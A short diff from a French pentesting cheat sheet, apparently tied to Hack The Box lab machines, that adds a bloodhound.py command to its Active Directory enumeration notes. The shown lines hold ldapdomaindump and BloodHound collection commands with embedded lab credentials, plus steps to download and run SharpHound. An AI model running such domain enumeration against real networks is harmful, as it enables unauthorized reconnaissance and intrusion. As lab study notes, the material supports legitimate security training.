@@ -348,7 +348,7 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
  
 - Ldapdomaindump (depuis un utilisateur extraire toutes les informations) --> `ldapdomaindump ldap://cicada.htb -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 
-- Utilisation de BloodHound --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt
+- Utilisation de BloodHound --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt OU directement `python bloodhound.py -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.10.11.51 -c All`
   	1. On récupère le collecteur --> `wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe`
   	2. On récupère BloodHound --> `wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-arm64.zip`
   	3. On lance le collecteur --> `.\sharphound.exe `
